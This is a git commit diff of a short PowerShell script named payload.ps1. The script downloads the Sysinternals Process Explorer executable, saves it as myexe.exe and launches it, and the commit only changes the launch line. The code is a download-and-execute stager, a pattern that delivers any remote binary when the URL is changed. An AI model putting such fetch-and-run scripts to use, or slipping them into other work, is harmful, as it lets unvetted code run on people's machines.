c826a2e50e5435ad71118f4ce0a3542c4d69d8db
Zarashigal J <120185445+Zaraaashiigal@users.noreply.github.com>
2023-02-15 10:40:59 +0100

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,4 +1,4 @@
 $url = "https://live.sysinternals.com/procexp64.exe"
 $outpath = "$PSScriptRoot/myexe.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
-&$outpath
+Start-Process -Filepath "$outpath"
